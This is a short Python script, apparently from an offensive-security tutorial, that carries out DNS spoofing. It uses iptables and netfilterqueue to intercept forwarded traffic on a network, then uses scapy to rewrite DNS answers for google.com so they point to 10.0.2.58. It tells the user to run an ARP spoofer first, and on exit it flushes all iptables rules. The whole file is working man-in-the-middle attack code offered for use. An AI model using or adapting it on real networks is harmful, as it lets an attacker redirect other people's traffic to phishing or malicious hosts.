
#!/usr/bin/env python
#This Script only works properly in  Python 3.6 
import netfilterqueue
import subprocess
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload()) #Converting NetFilterPacket into a Scapy Packet
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		url_name = "google.com"
		if url_name in str(qname):
			print("[+] He entered into Google!")
			answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.58")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(bytes(scapy_packet))
#	print(packet.get_payload())
	packet.accept()

def chain_creation(queue_num):

    subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num "+str(queue_num),shell=True)

def chain_delete():

    subprocess.call("sudo iptables --flush",shell=True)

n=0
print("[+] For DNS Spoofing, first make sure you're using an ARP Spoofer first")
queue_num=8
while n==0:
	try:
		chain_creation(queue_num)
		queue = netfilterqueue.NetfilterQueue()
		queue.bind(queue_num,process_packet)
		queue.run()

	except KeyboardInterrupt:
		print("KeyboardInterrupt pressed")
		chain_delete()
		n=1
